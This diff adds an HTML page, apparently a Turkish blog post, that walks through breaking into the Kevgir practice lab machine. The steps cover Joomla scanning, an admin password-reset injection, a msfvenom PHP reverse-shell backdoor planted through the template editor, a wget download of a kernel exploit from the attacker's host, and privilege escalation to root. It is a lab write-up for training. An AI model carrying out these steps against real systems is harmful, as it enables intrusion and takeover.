@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Mert BULUT</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Custom fonts for this template -->
+  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+  <!-- Custom styles for this template -->
+  <link href="css/clean-blog.min.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="index.html">Siber Güvenlik</a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="index.html">ANASAYFA</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="about.html">HAKKIMDA</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="post.html">BLOG</a>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('img/post-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+            <h1> CanYouPwnMe’nin hazırlamış olduğu typhoon adlı makineyi bu yazımla beraber çözeceğiz.</h1>
+            <h2 class="subheading">Joomla ile.</h2>
+            <span class="meta">Posted by
+              <a href="#">Mert Bulut</a>
+              17/03/2021</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>CanYouPwnMe’nin hazırlamış olduğu Kevgir adlı makineyi bu yazımla beraber çözmüş olacağız..</p>
+
+          <p>İlk olarak makineyi virtualbox’ımıza kurduktan sonra hangi IP adresini aldığını öğrenmek için netdiscover aracından yararlanmaktayız. Net discoverin sonucunda aşağıdaki resimde de görüldüğü gibi 192.168.1.104 IP adresini aldığını buluyoruz. Bundan sonraki işlemleri bu IP adresi üzerinden yapacağız.</p>
+          
+          <a href="#">
+            <img class="img-fluid" src="img/100.png" alt="">
+          </a>
+          <p> </p>
+          <a href="#">
+            <img class="img-fluid" src="img/101.png" alt="">
+          </a>
+          
+          <p>IP adresini de bulduğumuza göre, şimdi nmap ile port taramasını yaparak açık (open) olan servisleri (services) ve versiyonları (version) öğrenmiş olacağız. Taramayı yaptıktan sonra ise 8081 portunun açık olduğunu ve çalıştığını gördük. </p>
+          <a href="#">
+            <img class="img-fluid" src="img/102.png" alt="">
+          </a>
+          <p> </p>
+          <p>Makinenin sahip olduğu IP adresini tarayıcıda açtığımızda karşımıza KEVGIR yazılır bir ekran gelmektedir.</p>
+          <a href="#">
+            <img class="img-fluid" src="img/103.png" alt="">
+          </a>
+          <p> </p>
+          <p>8081 Portundan ilerleyeceğimizden dolayı, ilk olarak tarayıcıda 192.168.1.104:8081 adresini ziyaret ettik. Karşımıza Joomla’nın sayfası çıktı. </p>
+          <a href="#">
+            <img class="img-fluid" src="img/104.png" alt="">
+          </a>
+          <p> </p>
+
+          <p>Herkes tarafından biliniyor ki joomla, bir web sitenin cms’si ( Content Management System) olarak geçmektedir ve biliyoruz ki joomla’nın bu sürümü exploit (istismar) etmeye müsaittir. Bu yüzden joomscan komutu ile bir scan işlemi  yapıyoruz.
+            joomscan -u http://192.168.1.104:8081 (IP adresini kendi makinenizinki ile değiştirmeyi unutmayın.)
+            Tarama sonucu açık olan exploitleri gördük. Bunların arasından dikkatimizi çeken CVE-2008-3681 kodu olan Remote Admin Change Password adlı exploit dikkatimizi çekiyor.
+            </p>
+          <a href="#">
+            <img class="img-fluid" src="img/105.png" alt="">
+          </a>
+          <p> </p>
+          <p>İnternet üzerinden yaptığımız araştırmalar sonucu Joomla’nın admin panelindeki şifreyi değiştirebildiğimizi öğreniyoruz. Detaylı açıklamalar https://www.exploit-db.com/exploits/6234 burada yer alırken, şifreyi değiştirmek için 192.168.1.104:8081/ index.php?optiona=com_user&view=reset&layout=confirm adresine gitmemiz gerektiğini görmüş olduk.</p>
+          <a href="#">
+            <img class="img-fluid" src="img/106.png" alt="">
+          </a>
+          <p> </p>
+          
+          <p>Siteye gider gitmez karşımıza bir token ekranı geldi. Buraya tek tırnak (‘) sembolünü koyup submit’e tıklıyoruz.</p>
+          <a href="#">
+            <img class="img-fluid" src="img/107.png" alt="">
+          </a>
+          <p> </p>
+
+          <p>Submit ettikten sonra karşımıza resetleme ekranı gelmiş bulunmaktadır. Buradaki şifreyi istediğiniz bir şifre ile değiştirebilirsiniz.  </p>
+          <a href="#">
+            <img class="img-fluid" src="img/108.png" alt="">
+          </a>
+          <p> </p>
+          <p>Şifreyi değiştirdikten sonra karşınıza bir login ekranı gelmektedir. Buradaki username “admin” password ise az önce yapmış olduğunuz şifredir.  </p> 
+          
+          <a href="#">
+            <img class="img-fluid" src="img/109.png" alt="">
+          </a>
+          <p> </p>
+          <p>Başarıyla login olduktan sonra karşınıza administrator ekranı gelmektedir.  </p>
+          <a href="#">
+            <img class="img-fluid" src="img/110.png" alt="">
+          </a>
+          <p> </p>
+          
+          <p>Buradan sonra bir backdoor işlemi yapacağız. PHP ile oluşturacağımız backdooru siteye yüklememiz gerekmektedir. Bunun için Extensions sekmesine gelip oradan da Template Manager’ı seçiyoruz. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/111.png" alt="">
+          </a>
+          <p> </p>
+
+          <p>Karşımıza gelen ekranda iki tane kullanıcı görüyoruz. Biz işlemlerimizi beez üzerinden yapacağımız için beez’i seçip devam ediyoruz. </p>
+          <a href="#">
+            <img class="img-fluid" src="img/112.png" alt="">
+          </a>
+          <p> </p>
+
+          <p>Beez’i seçtikten sonra karşımıza gelen ekran aşağıdaki gibidir. Buradan da Edit HTML seçiyoruz. </p>
+          
+          <a href="#">
+            <img class="img-fluid" src="img/113.png" alt="">
+          </a>
+          <p> </p>
+
+
+          <p>Edit HTML sayfası geldikten sonra kutunun içine oluşturacağımız php backdoorunu koyacağız. Bunun için kutunun içindeki tüm yazıları siliyoruz.</p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/114.png" alt="">
+          </a>
+          <p> </p>
+
+          <p>Açtığımız yeni bir terminal ekranında msfvenom ile bir php backdooru oluşturuyoruz. Buradaki host saldırı yapacağımız makinenin IP adresi. Buna dikkat etmekte fayda var. Backdoor oluştuktan sonra <?php den die(); kısmına kadar komple kopyalıyoruz. Kopyaladıktan sonra bunu yukarıdaki edit HTML kısmına yapıştırıyoruz ve ardından save diyoruz.  </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/115.png" alt="">
+          </a>
+          <p> </p>
+
+          <p>Bunları yaparken msfconsole üzerinden dinleyeceğimiz için yeni bir terminal ekranında msfconsole açıyoruz. Exploit olarak multi/handler kullanacağız. Payload olarak ise php/meterpreter/reverse_tcp kullanıyoruz. Host ve port’ların oluşturduğumuz backdoor ile aynı olmasına dikkat ettikten sonra exploit diyip dinlemeye geçiyoruz. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/116.png" alt="">
+          </a>
+          <p> </p>
+
+
+          <p>Backdoorun düzgünce çalışması için HTML’i save ettikten sonra beez sayfasına dönnüyoruz. Buradan da Preview sekmesine tıklayarak sızma işlemini tamamlıyoruz.</p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/117.png" alt="">
+            <img class="img-fluid" src="img/118.png" alt="">
+
+          </a>
+          <p> </p>
+
+
+
+          <p>Sızdıktan sonra Shell almamız gerektiği için komut satırına Shell yazıyoruz.  Shell’i aldıktan sonra işlemlerimizi yapabilmemiz için etkileşimli shell almamız gerekmektedir. Bunun için 2 adet python komutundan yararlanmaktayız.  python -c ‘import  pty;pty.spawn(“/bin/bash”)’</p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/119.png" alt="">
+            
+          </a>
+          <p> </p>
+
+
+          <p>LSB modüllerinin olup olmadığını görmek için lsb_release -a komutunu etkileşimli  shelle’e yazıyoruz.  Aşağıdaki resimdeki gibi olmadığı görüyoruz. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/120.png" alt="">
+          </a>
+          <p> </p>
+          <p>Buradan sonra yetki yükseltme saldırısı yapacağımız için hangi dosyaların yazılabilir olduğunun öğrenmemiz gerekiyor. Bunun için ise find  /  -writable  -type  d 2>/dev/null  komutunu  kullanıyoruz. Oldukça fazla olan listede gözümüze ilk çarpan /tmp klasörü olmaktadır.  Bu tarz makinelerin çoğunda indirme tarzı işlemleri genellikle tmp klasöründen yapılmaktadır. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/121.png" alt="">
+          </a>
+          <p> </p>
+          <p>Bu bilgileri aklımızda tuttuktan sonra yeni bir terminal ekranından ssh ile admin sunucusuna bağlanıyoruz.  ssh admin@192.168.1.104 -p  1322 komutu ile bağlandıktan hemen sonra şifre girmemizi istiyor. Bu şifre oluşturduğumuz şifredir. Şifreyi girdikten sonra başarılı bir şekilde sunucuya bağlanıyoruz. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/122.png" alt="">
+          </a>
+          <p> </p>
+          <p>Bağlandıktan hemen sonra uname -a komutu ile hangi kernel sürümünü kullandığını öğreniyoruz. Burada Ubuntu 14.04 sürümü olduğunu görüyoruz. Kernel sürümünü öğrendikten sonra internet üzerinden yaptığımız bir araştırma ile 39166.c  dosyası ile root yetkisi  alabileceğimizi öğreniyoruz. Detaylı bilgileri https://www.exploit-db.com/exploits/39166 adresinden öğrenebilirsiniz. </p>
+          
+          <a href="#">
+            <img class="img-fluid" src="img/123.png" alt="">
+          </a>
+          <p> </p>
+          <p>Exploitdb üzerinden 39166 dosyasını ilk önce kendi bilgisayarımıza indiriyoruz. İndirdikten sonra terminale python -m SimpleHTTPServer 9000 komutu ile Directory Listening açıyoruz. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/124.png" alt="">
+          </a>
+          <p> </p>
+          <p>Bu komutu girdikten sonra, tarayıcımıza girip 192.168.1.103:9000 yazıyoruz (IP adresinin kendi IP adresi ile değiştirmeyi unutmayın.). Karşımıza gelen web sayfasında kodun ismi olan 39166.c’nin üzerine tıklayıp url kısmını kopyalıyoruz. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/125.png" alt="">
+          </a>
+          <p> </p>
+          <p>Url’yi aldıktan sonra tekrar sızma işlemini yaptığımız terminale dönüyoruz. Burada kodu indirmemiz gerektiği için temp (/tmp) dosyasına girmemiz gerekmektedir çünkü temp bize indirme işlemine izin vermektedir. Genellikle bu tarz makinelerin hepsinde bu böyledir ama ls -la komutu ile izinleri kontrol etmekte fayda var. cd /tmp komutu ile temp klasörünün içerisine giriyoruz. Girdikten sonra kopyaladığımız url’yi wget http://192.168.1.103:9000/39166.c komutu ile indiriyoruz. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/126.png" alt="">
+          </a>
+          <p> </p>
+          <p>Tmp içine girdikten sonra indirdiğimiz kodu derlememiz gerekmektedir. Bunun için gcc komutunun kullanıyoruz. gcc 39166.c -o privs komutu ile derledikten sonra ardına outputumuz olan privs’e chmod ile yetki veriyoruz. Bunun için chmod 777 privs komutunnu kullanıyoruz. Yetki verdikten sonra ise outputu ./privs ile çalıştırıyoruz. İşlem bittikten sonra komut satırına id yazdığımızda bizim root olduğumuzu göstermektedir.   </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/127.png" alt="">
+          </a>
+          <p> </p>
+          <p>Bir başka root olduğumuzu gösteren kanıt ise banner dosyasının içindeki kevgir dosyasıdır. Bunu cat kevgir diyerek açtığımızda karşımıza KEVGIR yazısı gelmektedir. </p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/128.png" alt="">
+          </a>
+          <p> </p>
+
+          <p>Bilgilendirme yazım bitmiştir. Vakit ayırdığınız için teşekkür ederim. Bir sonraki writeup’da görüşmek üzere.</p>
+
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <hr>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            <li class="list-inline-item">
+              <a href="https://www.linkedin.com/in/mert-bulut7/">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            <li class="list-inline-item">
+              <a href="https://github.com/ufcovo">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy; Your Website 2020</p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Custom scripts for this template -->
+  <script src="js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
